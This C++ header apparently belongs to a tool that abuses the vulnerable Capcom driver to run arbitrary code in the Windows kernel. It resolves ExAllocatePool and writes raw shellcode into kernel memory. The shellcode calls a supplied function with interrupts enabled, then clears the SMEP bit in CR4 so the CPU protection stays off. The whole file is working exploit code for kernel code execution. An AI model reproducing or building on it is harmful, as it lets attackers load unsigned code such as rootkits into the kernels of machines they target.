#pragma once
#include "KernelRoutines.h"
#include "LockedMemory.h"
#include "CapcomLoader.h"

// 3 args max! If you need more args, change the shell code
using fnPassiveCall = uint64_t( *)( PVOID Function, ... );

NON_PAGED_DATA static fnFreeCall Khk_ExAllocatePool = 0;
NON_PAGED_DATA static fnPassiveCall Khk_PassiveCall = 0;

// This function is the only _TRICKY_ part of this project.
// ExAllocatePool does not require interrupts to be enabled WHEN the size is small and we are depending on that.
NON_PAGED_CODE static void Khk_AllocatePassiveStub()
{
	NON_PAGED_DATA static UCHAR Kh_PassiveCallStub[] = 
	{
		0x55,									// push   rbp
		0x48, 0x89, 0xE5,						// mov    rbp,rsp
		0x48, 0x83, 0xEC, 0x30, 				// sub    rsp,0x30
		0xFB, 									// sti
		0x48, 0x89, 0xC8, 						// mov    rax,rcx
		0x48, 0x89, 0xD1, 						// mov    rcx,rdx
		0x4C, 0x89, 0xC2, 						// mov    rdx,r8
		0x4D, 0x89, 0xC8, 						// mov    r8,r9
		0xFF, 0xD0, 							// call   rax
		0xFA, 									// cli
		0x0F, 0x20, 0xE1, 						// mov    rcx,cr4
		0x48, 0x0F, 0xBA, 0xF1, 0x14, 			// btr    rcx,0x14
		0x0F, 0x22, 0xE1, 						// mov    cr4,rcx
		0x48, 0x89, 0xEC, 						// mov    rsp,rbp
		0x5D, 									// pop    rbp
		0xC3 									// ret
	};

	PVOID Out = ( PVOID ) Khk_ExAllocatePool( 0ull, sizeof( Kh_PassiveCallStub ) );
	Np_memcpy( Out, Kh_PassiveCallStub, sizeof( Kh_PassiveCallStub ) );
	Khk_PassiveCall = ( fnPassiveCall ) Out;
}

static void Khu_Init( CapcomContext* CpCtx, KernelContext* KrCtx )
{
	Khk_ExAllocatePool = KrCtx->GetProcAddress<fnFreeCall>( "ExAllocatePool" );
	CpCtx->ExecuteInKernel( Khk_AllocatePassiveStub );
}